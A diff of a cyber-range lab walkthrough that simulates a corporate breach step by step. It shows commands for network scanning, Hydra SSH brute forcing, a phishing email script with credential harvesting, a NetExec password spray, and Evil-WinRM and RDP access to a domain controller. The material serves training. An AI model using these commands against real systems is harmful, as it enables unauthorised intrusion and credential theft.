@@ -5,47 +5,31 @@ The attacker machine is the Kali Linux VM (`project-attacker`), targeting Projec
 ## Prerequisites
 
 - All VMs in the “Deploy VMs + Services” and “Tools” sections configured
-    
 - Attacker machine provisioned
-    
 - Network topology active and reachable
-    
 - MailHog, Wazuh, Windows/Linux clients, and Domain Controller running
-    
 
 ---
-
-# Cyber Attack Overview
+## Cyber Attack Overview
 
 The simulation recreates a financially motivated threat actor compromising a corporate network.  
 The attacker’s end goal is:
-
 - Capture sensitive data
-    
 - Create persistence to return later
-    
 - Evade detection as long as possible
-    
 
 The attack follows the core phases used in real-world campaigns.
 
 ---
-
-# Reconnaissance
+## Reconnaissance
 
 Recon is the initial phase where the attacker gathers information without alerting the target.
+### Mandatory VMs
+- project-sec-box
+- project-corp-svr
+- project-attacker
 
-## Mandatory VMs
-
-- project-x-sec-box
-    
-- project-x-corp-svr
-    
-- project-x-attacker
-    
-
-## Network Scan
-
+### Network Scan
 From attacker (Kali):
 
 ```
@@ -53,23 +37,14 @@ nmap -p1-1000 -Pn -sV 10.0.0.8/24
 ```
 
 Flags:
-
 - `-p`: port range
-    
 - `-sV`: detect services
-    
 - `-Pn`: skip ping checks
-    
 
 Findings:
-
 - SSH service exposed on 10.0.0.8
-    
 - Indicates potential admin interface or server service
-    
-
-## Brute-force SSH (Hydra)
-
+### Brute-force SSH (Hydra)
 Attacker loads default wordlist rockyou.txt:
 
 ```
@@ -78,7 +53,6 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
 
 Hydra discovers valid credentials:  
 root / november
-
 ## Access Server
 
 ```
@@ -89,21 +63,13 @@ password: november
 Initial access achieved.
 
 ---
-
-# Initial Access
-
+## Initial Access
 After SSH compromise, the attacker fingerprint the system.
-
-## Mandatory VMs
-
-- project-x-sec-box
-    
-- project-x-corp-svr
-    
-- project-x-attacker
-    
-- project-x-linux-client
-    
+### Mandatory VMs
+- project-sec-box
+- project-corp-svr
+- project-attacker
+- project-linux-client
 
 ## Device Enumeration
 
@@ -119,15 +85,10 @@ find / -name "password" 2>/dev/null
 ```
 
 Key discovery:
-
 - Port 1025 open (SMTP)
-    
 - Port 8025 likely MailHog inbox
-    
 - Sensitive mail data accessible
-    
-
-## Access MailHog API
+### Access MailHog API
 
 ```
 curl http://10.0.0.8:8025/api/v2/messages
@@ -137,11 +98,9 @@ Emails referencing user `janed@linux-client` found.
 This gives attacker a target for phishing.
 
 ---
+## Setup the Phish and Capture Credentials
 
-# Setup the Phish and Capture Credentials
-
-## Host Phishing Website (Attacker machine)
-
+### Host Phishing Website (Attacker machine)
 Clone phishing template:
 
 ```
@@ -153,26 +112,22 @@ sudo service apache2 start
 ```
 
 Captured credentials appear in `creds.log`.
-
-## Craft and Send Phishing Email
-
-On `project-x-corp-svr`:
+### Craft and Send Phishing Email
+On `project-corp-svr`:
 
 Create script:
-
 ```
 sudo nano send_email.py
 ```
 
 Content:
-
 ```
 import smtplib
 from email.message import EmailMessage
 
 msg = EmailMessage()
 msg["Subject"] = "Update Password!"
-msg["From"] = "project-x-hrteam@corp.project-x-dc.com"
+msg["From"] = "project-hrteam@corp.project-x-dc.com"
 msg["To"] = "janed@linux-client"
 
 msg.set_content("Verify your account.")
@@ -188,13 +143,11 @@ with smtplib.SMTP("localhost", 1025) as server:
 ```
 
 Send email:
-
 ```
 sudo python3 send_email.py
 ```
 
-## Credential Harvest
-
+### Credential Harvest
 On linux-client, email_poller.sh captures the phishing email.  
 User submits credentials → attacker reads:
 
@@ -203,8 +156,7 @@ cat /var/www/html/creds.log
 ```
 
 Attacker obtains: janed / password123 (example)
-
-## SSH into linux-client
+### SSH into linux-client
 
 ```
 ssh janed@10.0.0.101
@@ -213,23 +165,16 @@ ssh janed@10.0.0.101
 Access successful.
 
 ---
+## Lateral Movement + Privilege Escalation
 
-# Lateral Movement + Privilege Escalation
-
-## Mandatory VMs
-
+### Mandatory VMs
 - project-x-sec-box
-    
 - project-x-linux-client
-    
 - project-x-win-client
-    
 - project-x-dc
-    
 - project-x-attacker
-    
 
-## Network Enumeration
+### Network Enumeration
 
 ```
 nmap -Pn -p1-65535 -sV 10.0.0.0/24
@@ -237,9 +182,7 @@ nmap -Pn -p1-65535 -sV 10.0.0.0/24
 
 Findings:  
 Ports 5985/5986 open → WinRM endpoint on Windows client.
-
-## Password Spray (NetExec)
-
+### Password Spray (NetExec)
 Create files:
 
 ```
@@ -248,14 +191,13 @@ sudo nano pass.txt    → @Deeboodah1!
 ```
 
 Spray:
-
 ```
 nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 ```
 
 Successful login for Administrator.
 
-## WinRM Shell Access (Evil-WinRM)
+### WinRM Shell Access (Evil-WinRM)
 
 ```
 evil-winrm -I 10.0.0.100 -u Administrator -p @Deeboodah1!
@@ -264,27 +206,22 @@ evil-winrm -I 10.0.0.100 -u Administrator -p @Deeboodah1!
 Attacker obtains Windows shell with administrator rights.
 
 ---
+## Lateral Movement 2.0: Domain Controller Access
 
-# Lateral Movement 2.0: Domain Controller Access
-
-## Identify Domain
+### Identify Domain
 
 ```
-nltest /dsgetdc:corp.project-x-dc.com
+nltest /dsgetdc:corp.project-dc.com
 ```
 
-## RDP into the DC
-
+### RDP into the DC
 From attacker:
-
 ```
-xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-x-dc.com
+xfreerdp /v:10.0.0.5 /u:Administrator /p:@Deeboodah1! /d:corp.project-dc.com
 ```
 
 Attacker now controls Domain Controller.
-
-## Find Sensitive Files
-
+### Find Sensitive Files
 Inside:
 
 ```
@@ -292,17 +229,13 @@ C:\Users\Administrator\Documents\ProductionFiles\secrets.txt
 ```
 
 ---
+## Data Exfiltration
 
-# Data Exfiltration
-
-## Mandatory VMs
+### Mandatory VMs
 
 - project-x-sec-box
-    
 - project-x-dc
-    
 - project-x-attacker
-    
 
 ## Transfer File via SCP
 
